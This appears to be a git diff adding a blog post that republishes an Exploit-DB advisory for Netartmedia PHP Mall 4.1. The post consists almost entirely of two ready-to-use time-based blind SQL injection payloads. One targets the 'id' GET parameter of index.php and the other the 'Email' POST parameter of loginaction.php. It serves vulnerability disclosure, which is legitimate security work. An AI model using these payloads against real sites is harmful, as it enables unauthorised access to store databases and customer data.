@@ -1,0 +1,33 @@
+2019-03-19-netartmedia-php-mall-multiple-sql-injection.Markdown
+
+---
+layout:     post
+title:      "Netartmedia PHP Mall 4.1 - Multiple SQL Injection"
+date:       2019-03-19 12:36
+author:     "Ahmet Ümit BAYRAM"
+category:   exploit
+tags:       [sql, sqli, sql injection, exploit-db]
+---
+
+# Exploit Title: Netartmedia PHP Mall 4.1 - Multiple SQL Injection
+# Date: 19.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.netartmedia.net/mall/
+# Demo Site: https://www.phpscriptdemos.com/mall/
+# Version: 4.1
+# Tested on: Kali Linux
+# CVE: N/A
+# Description: PHP Mall is one of the first multi-stores and multi-vendors
+php scripts (offered since 2006) and successfully used on many websites
+today.
+
+----- PoC 1 : SQLi (time-based blind) -----
+# Request: http://localhost/[PATH]/index.php
+# Parameter: id (GET)
+# Payload: id=1 AND SLEEP(5)&item=&lang=en&mod=details
+
+----- PoC 2 : SQLi (time-based blind) ----
+# Request: http://localhost/[PATH]/loginaction.php
+# Parameter: Email (POST)
+# Payload: Email=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z' OR SLEEP(5)
+AND 'tOoX'='tOoX&Password=g00dPa$$w0rD&lang=en
